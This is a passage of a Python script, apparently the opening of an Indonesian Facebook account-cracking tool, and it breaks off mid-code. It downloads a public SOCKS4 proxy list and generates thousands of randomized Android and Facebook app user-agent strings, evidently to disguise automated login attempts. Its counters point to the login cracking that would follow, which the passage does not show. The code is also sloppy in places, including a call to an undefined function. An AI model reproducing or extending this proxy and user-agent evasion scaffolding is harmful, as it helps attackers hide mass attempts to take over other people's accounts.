#ASTAGFIRULLAH JEBOL
import requests,json,os,sys,random,datetime,time,re,platform
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu
from rich.panel import Panel as panel
from rich import print as cetak
from rich.console import Console as sol
from rich.markdown import Markdown as mark

###----------[ GLOBAL NAMA ]----------###
id,id2,uid = [],[],[]
tokenefb = []
akunyeh = []
ugen = []
usam = []
uga = []
uaa = []
geko = []
loop,bra = 0,[]
ok,cp,oo = 0,0,[]
usragent = []
tokenku = []
###----------[ GET PROXY ]----------###
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=800000&country=all&ssl=all&anonymity=all').text
	open('.socksku.txt','w').write(proxylist)
except Exception as e:
	bra_anim(f'Nyalain data Suhu')
proxsi=open('.socksku.txt','r').read().splitlines()
limitd=0
for agenkuw in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12'])
	c='CPH2109'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	uaa.append(uakuh)	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12'])
	c='CPH2089'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	uaa.append(uakuh)	
	a='Mozilla/5.0 (Linux; Android 11; '
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='J8_EEA)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Safari/537.36'
	uaku2=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uaku2)	
	a='Mozilla/5.0 (Linux; Android 12;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='SM-A536B Build/SP1A.210812.016; wv) '
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 '
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]'
	uakuh=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uakuh)	
	a='Mozilla/5.0 (Linux; Android 11;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='es-mx; ZTE 8045 Build/RP1A.201005.001; wv)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/108.0.5359.61'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 MMS/ZTE-Android- MMS-V2.0'
	uaku2=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uaku2)	
	a='Mozilla/5.0 (Linux; Android 12; '
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='CPH2127 Build/RKQ1.211119.001; wv) '
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/113.0.5672.76 '
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 JsSdk/2 NewsArticle/8.1.7 NetType/wifi'
	uakuh=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uakuh)	
	a='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='CPH1809 Build/OPM1.171019.026; wv)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/108.0.5359.128'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Seluler Safari/537.36 [FB_IAB/Orca-Android;FBAV/ 396.0.0.14.82;]'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uaku)	
	a='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Redmi 4A Build/N2G47H)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 XiaoMi/Mint Browser/1.3.3'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uaku)	
	a='Mozilla/5.0 (Linux; Android 12;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Infinix X670 Build/SP1A.210812.016; wv)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uaku)	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0''6.0','7.0','8.1.0','9','10','11','12'])
	c='Infinix X689)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uaku=(f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}')
	uaa.append(uaku)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0''6.0','7.0','8.1.0','9','10','11','12'])
	c='vivo 1820 Build/O11019; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36 VivoBrowser/9.8.2.0'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	uaa.append(uaku)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c='Lenovo A7700 Build/MRA58K)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uaku=(f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}')
	uaa.append(uaku)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6.0.1','7.1.1','8.1.0'])
	c='SM-G532M Build/MMB29T; wv) '
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]'
	uaku=(f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}')
	uaa.append(uaku)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c='CPH2071 Build/PPR1.180610.011; wv) '
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]'
	uaku=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	uaa.append(uaku)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c='Redmi Note 8)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uaku=(f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}')
	uaa.append(uaku)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c='Infinix X6511B)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uaku=(f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}')
	uaa.append(uaku)
	aa='Mozilla/5.0 (Linux; Android 11.1;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='TVBOX-5G) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 '
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0; '
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi 5 Plus Build/OPM1.171019.019; wv) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 13;'
	b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
	c='CPH2273 Build/TP1A.220905.001; wv) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.170'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/412.0.0.22.115;]'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 10; '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['moto e(7) plus Build/QPZS30.30-Q3-38-69-12; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/353.0.0.5.112;FBDM/DisplayMetrics'+'{density=1.75, width=720, height=1473, scaledDensity=1.75, xdpi=268.941, ydpi=269.139};]'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['zh-cn; Redmi 5 Plus Build/N2G47H)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.1'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi 5 Plus Build/OPM1.171019.019; ru-ru)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Puffin/9.7.2.51367AP'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='9; CPH1825)P259E)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.77.0.4152.48.4264.57'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='CPH1825)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.4152.48'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 9;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SM-J120H Build/PKQ1.130176.001; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.5510.79'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; U; Android 8.1.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-us; OPPO PBBT30 Build/OPM1.171019.026)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/53.0.2785.134'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 OppoBrowser/4.7. 9'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='PBAM00 Build/OPM1.171019.026; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/109.0.5414.117'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Seluler Safari/537.36 [FB_IAB/FB4A;FBAV/391.1. 0.37.104;]'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['2.3.6;','4.0.4;','4.2.1;','4.2.2;','4.3;','4.4.2;','4.4.4;','5.0;','5.0.2;','5.1;','5.1.1;','6.0;','6;','6.0.1;','7.0.1;','7;','8;','8.0;','5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['meizu C9 Build/OPM2.171019.012; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	a='Mozilla/5.0 (Linux; Android 10;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='CPH2239)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko)'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Chrome/87.0.4280.101 Mobile Safari/537.36'
	uakuh=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uakuh)
	a='Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='Linux; Android 7.1.2; Redmi 4A)'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile Safari/E7FBAF'
	uaku2=(f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; U; Android 8.1.0; '
	b=random.choice(['6','7','8','9','10','11','12'])
	c='it-it; Redmi 5 Plus Build/OPM1.171019.019) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.9.8-g'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
	c='Redmi 5 Plus Build/OPM1.171019.019) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.85'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 7.1.2; '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi 5 Plus Build/N2G47H; ru-ru)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 '
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Puffin/9.7.2.51367AP'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['zh-cn; Redmi 5 Plus Build/N2G47H) '])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0; '
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi 5 Plus Build/OPM1.171019.019; ru-ru)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Puffin/9.7.2.51367AP'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (X11;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Linux x86_64)'
